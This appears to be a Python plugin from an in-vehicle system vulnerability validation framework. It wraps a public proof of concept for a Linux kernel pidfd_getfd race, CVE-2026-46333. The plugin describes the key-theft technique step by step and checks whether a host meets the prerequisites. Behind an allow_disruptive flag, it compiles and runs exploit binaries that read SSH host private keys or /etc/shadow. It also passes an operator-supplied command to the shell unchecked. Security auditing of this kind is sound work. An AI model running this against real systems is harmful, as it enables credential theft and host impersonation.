#!/usr/bin/env python3
"""CVE-2026-46333 – SSH Keysign FD Theft: __ptrace_may_access() skips dumpable check when task->mm==NULL during do_exit(); pidfd_getfd(2) can steal SUID program's open root-only file descriptors (SSH host keys, /etc/shadow) in the exit window.

Public PoC source: https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46333%20SSH%20Keysign%20pwn
  Files: ['exploit/sshkeysign_pwn.c', 'exploit/chage_pwn.c',
          'exploit/vuln_target.c', 'exploit/exploit_vuln_target.c', 'exploit/Makefile']
  Technique:
    1. Repeatedly fork() ssh-keysign or /usr/bin/chage -l root (both are SUID-root).
    2. Parent calls pidfd_open(child) immediately, then races pidfd_getfd(pidfd, fd_n, 0)
       against child's do_exit() window where exit_mm() completed but exit_files() hasn't.
    3. __ptrace_may_access() skips dumpable check when task->mm==NULL → pidfd_getfd() succeeds.
    4. Stolen fd is a dup of ssh-keysign's /etc/ssh/ssh_host_*_key or chage's /etc/shadow.
    5. lseek(0)+read() extracts key/shadow content; offline crack → root.
  Race hits in 100–2000 spawns on unpatched kernels.
  Patch commit: 31e62c2ebbfd (2026-05-14)
  Confirmed on: Raspberry Pi OS Bookworm 6.12.75, Debian 13, Ubuntu 22/24/26.04, Arch, CentOS 9.

Reference: https://nvd.nist.gov/vuln/detail/CVE-2026-46333
"""
from __future__ import annotations

import subprocess
import tempfile
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 55,
    "cve": "CVE-2026-46333",
    "year": 2026,
    "domain": "advanced",
    "vendor_product": "Linux kernel (IVI/车载 SSH 节点 with ssh-keysign)",
    "component": "Linux kernel kernel/ptrace.c – __ptrace_may_access() mm-NULL dumpable check bypass + pidfd_getfd(2)",
    "type": "本地信息泄露 / SSH 主机私钥窃取 / /etc/shadow 读取",
    "summary": (
        "CVE-2026-46333 SSH Keysign FD Theft: do_exit() 在 exit_mm() 后 exit_files() 前存在窗口，"
        "此时 task->mm==NULL 使 __ptrace_may_access() 跳过 dumpable 检查，"
        "pidfd_getfd() 可从 SUID 程序（ssh-keysign / chage）窃取 root-only 文件描述符，"
        "直接读取 SSH 主机私钥 (/etc/ssh/ssh_host_*_key) 或 /etc/shadow。"
        "车载 IVI 节点若开放 SSH 服务则面临主机密钥泄露风险，可用于 MITM/横向攻击。"
    ),
    "source_url": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46333%20SSH%20Keysign%20pwn",
    "requires_manual_review": True,
    "affected": [
        {
            "vendor": "Linux",
            "product": "Linux kernel",
            "versions": [
                {"version": "any", "status": "affected", "lessThan": "31e62c2ebbfd (2026-05-14)"},
            ],
        }
    ],
}

POC_REPO = (
    Path(__file__).parent.parent.parent
    / "public_poc_sources/repos/Unclecheng-li__poc-lab"
    / "CVE-2026-46333 SSH Keysign pwn/exploit"
)

# ssh-keysign search paths (from PoC PATHS[])
_SSHKEYSIGN_PATHS = [
    "/usr/libexec/ssh-keysign",
    "/usr/libexec/openssh/ssh-keysign",
    "/usr/lib/ssh/ssh-keysign",
    "/usr/lib/openssh/ssh-keysign",
]


def _check_prerequisites() -> dict:
    result: dict = {}
    try:
        import os
        r = subprocess.run(["uname", "-r"], capture_output=True, text=True, timeout=5)
        result["kernel_version"] = r.stdout.strip()

        # Check patch (kernel/ptrace.c commit 31e62c2ebbfd)
        ks = Path("/proc/kallsyms")
        if ks.exists():
            # Post-patch kernels handle the mm-NULL case; no simple symbol to check,
            # so we report version-based heuristic only.
            pass
        result["patch_commit"] = "31e62c2ebbfd"

        # Check pidfd syscalls
        result["pidfd_open_syscall_nr"] = 434
        result["pidfd_getfd_syscall_nr"] = 438

        # Check ssh-keysign
        found_ks = next((p for p in _SSHKEYSIGN_PATHS if Path(p).exists()), None)
        result["ssh_keysign_path"] = found_ks
        result["ssh_keysign_is_suid"] = (
            bool(found_ks) and bool(Path(found_ks).stat().st_mode & 0o4000)
            if found_ks else False
        )

        # Check chage
        chage = Path("/usr/bin/chage")
        result["chage_path"] = str(chage) if chage.exists() else None
        result["chage_is_suid"] = chage.exists() and bool(chage.stat().st_mode & 0o4000)

        # Check SSH host keys existence
        host_keys = list(Path("/etc/ssh").glob("ssh_host_*_key")) if Path("/etc/ssh").exists() else []
        result["ssh_host_keys"] = [str(k) for k in host_keys]
        result["ssh_host_key_readable_by_nonroot"] = [
            str(k) for k in host_keys if os.access(str(k), os.R_OK)
        ]

        # Check shadow
        result["shadow_exists"] = Path("/etc/shadow").exists()

    except Exception as exc:
        result["check_error"] = str(exc)
    return result


def _compile_and_run(allow_disruptive: bool, lab_cmd: str) -> dict:
    result: dict = {}

    sshkeysign_c = POC_REPO / "sshkeysign_pwn.c"
    makefile = POC_REPO / "Makefile"

    if not sshkeysign_c.exists():
        result["poc_repo_missing"] = str(POC_REPO)
        result["detail"] = (
            "Clone https://github.com/Unclecheng-li/poc-lab into "
            "public_poc_sources/repos/Unclecheng-li__poc-lab to enable compilation. "
            "Build: make && ./sshkeysign_pwn  (reads SSH host private key) "
            "       ./chage_pwn root          (reads /etc/shadow)"
        )
        result["would_compile"] = "make -C exploit"
        result["would_run_ks"] = "./sshkeysign_pwn"
        result["would_run_shadow"] = "./chage_pwn root"
        return result

    if not allow_disruptive:
        result["would_compile"] = "make"
        result["would_run_ks"] = "./sshkeysign_pwn"
        result["would_run_shadow"] = "./chage_pwn root"
        result["detail"] = (
            "Set allow_disruptive=true to compile and race the exit window. "
            "This will attempt to read /etc/ssh/ssh_host_*_key via pidfd_getfd race. "
            "Runs 100–2000 spawn rounds; output: SSH private key or /etc/shadow content."
        )
        return result

    with tempfile.TemporaryDirectory() as tmpdir:
        import shutil
        for f in POC_REPO.iterdir():
            if f.is_file():
                shutil.copy2(str(f), f"{tmpdir}/{f.name}")

        # Build
        if makefile.exists():
            r = subprocess.run("make", shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=60)
        else:
            r = subprocess.run(
                "gcc -O2 -o sshkeysign_pwn sshkeysign_pwn.c && "
                "gcc -O2 -o chage_pwn chage_pwn.c && "
                "gcc -O2 -o vuln_target vuln_target.c && "
                "gcc -O2 -o exploit_vuln_target exploit_vuln_target.c || true",
                shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=60,
            )
        result["compile_rc"] = r.returncode
        result["compile_out"] = (r.stdout + r.stderr)[:400]

        if r.returncode != 0:
            result["detail"] = "Compile failed."
            return result

        # Run sshkeysign_pwn (timeout 60s; hits in ~100-2000 rounds)
        ks_bin = Path(tmpdir) / "sshkeysign_pwn"
        if ks_bin.exists():
            r2 = subprocess.run(
                f"./sshkeysign_pwn 2>&1 | head -30; {lab_cmd}",
                shell=True, cwd=tmpdir, capture_output=True, text=True, timeout=90,
            )
            result["sshkeysign_run_rc"] = r2.returncode
            result["sshkeysign_out"] = r2.stdout[:800]
            result["ssh_key_stolen"] = (
                "BEGIN OPENSSH PRIVATE KEY" in r2.stdout
                or "BEGIN EC PRIVATE KEY" in r2.stdout
                or "BEGIN RSA PRIVATE KEY" in r2.stdout
                or "ssh_host_" in r2.stdout
            )
            result["exploited"] = result["ssh_key_stolen"]

    return result


def _run_poc(plugin) -> dict:
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))
    lab_cmd = (plugin.params or {}).get("lab_command", "id")

    evidence: dict = {
        "cve": "CVE-2026-46333",
        "poc_repo": str(POC_REPO),
        "poc_repo_present": (POC_REPO / "sshkeysign_pwn.c").exists(),
        "exploit_files": [
            "exploit/sshkeysign_pwn.c",
            "exploit/chage_pwn.c",
            "exploit/vuln_target.c",
            "exploit/exploit_vuln_target.c",
        ],
        "technique": (
            "fork() ssh-keysign (SUID-root) → pidfd_open(child) "
            "→ race do_exit() window: exit_mm() done, exit_files() pending "
            "→ __ptrace_may_access() skips dumpable check (task->mm==NULL) "
            "→ pidfd_getfd() succeeds → dup of /etc/ssh/ssh_host_*_key fd "
            "→ lseek(0)+read() → SSH private key exfiltrated. "
            "Hits in 100–2000 spawns. Patch: 31e62c2ebbfd (2026-05-14)."
        ),
        "attack_consequence": (
            "SSH host private key leak → MITM / host impersonation / lateral movement. "
            "On IVI nodes with SSH exposed: complete session hijack capability."
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-46333",
    }

    prereq = _check_prerequisites()
    evidence.update(prereq)
    exploit = _compile_and_run(allow_disruptive, lab_cmd)
    evidence.update(exploit)

    # Assessment heuristic
    vulnerable = evidence.get("exploited")
    if vulnerable is None:
        if evidence.get("ssh_keysign_is_suid") or evidence.get("chage_is_suid"):
            # Target exists; kernel unverified without running
            vulnerable = None  # inconclusive

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46333%20SSH%20Keysign%20pwn",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc55CVE202646333SSHKeysignFDTheftInfoLeakAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-ADV-055"
    meta_poc_name = 'CVE-2026-46333 leak Active Validation'
    meta_cve_id = "CVE-2026-46333"
    meta_severity = "High"
    meta_protocol = "local"
    meta_target_os = ["linux"]
    meta_required_params = []
    meta_optional_params = ["allow_disruptive", "lab_command"]
    meta_profiles = ["advanced", "kernel", "infoleek", "ssh"]
    meta_source_url = "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46333%20SSH%20Keysign%20pwn"
    meta_references       = ['https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46333%20SSH%20Keysign%20pwn']
    meta_attack_surface = (
        "本地非特权用户通过 pidfd_getfd race 窃取 ssh-keysign 的 SSH 主机私钥 fd → 密钥泄露/MITM"
    )
    is_disruptive = True
    meta_destructive_level = "CredentialTheft"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "55_Linux_SSHKeysign_FD_Theft_InfoLeak_Audit") if "VULN" in dir() else "55_Linux_SSHKeysign_FD_Theft_InfoLeak_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc55CVE202646333SSHKeysignFDTheftInfoLeakAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
